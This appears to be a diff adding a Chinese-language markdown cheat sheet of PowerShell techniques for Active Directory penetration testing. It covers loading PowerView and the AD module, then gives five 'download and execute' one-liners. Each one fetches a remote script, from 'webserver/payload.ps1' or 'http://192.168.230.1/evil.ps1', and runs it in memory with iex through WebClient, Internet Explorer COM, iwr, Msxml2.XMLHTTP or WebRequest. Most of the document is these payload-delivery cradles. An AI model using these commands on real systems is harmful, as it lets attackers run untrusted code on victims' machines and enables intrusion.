@@ -1,0 +1,48 @@
+# 引入powershell脚本
+
+一个```.```空一格后面加引入脚本
+```
+. C:\AD\Tools\PowerView.ps1
+```
+
+# 引入powershell模块
+```
+Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
+```
+
+# 列出模块命令
+```
+Get-Command -Module <modulename>
+```
+
+# 下载执行
+
+1.
+```
+iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+```
+
+2.
+```
+$ie=New-Object -ComObject
+InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+```
+
+3.
+```
+PSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')
+```
+
+4.
+```
+$h=New-Object -ComObjectMsxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
+$h.responseText
+```
+
+5.
+```
+$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
+$r = $wr.GetResponse()
+IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
+```
+
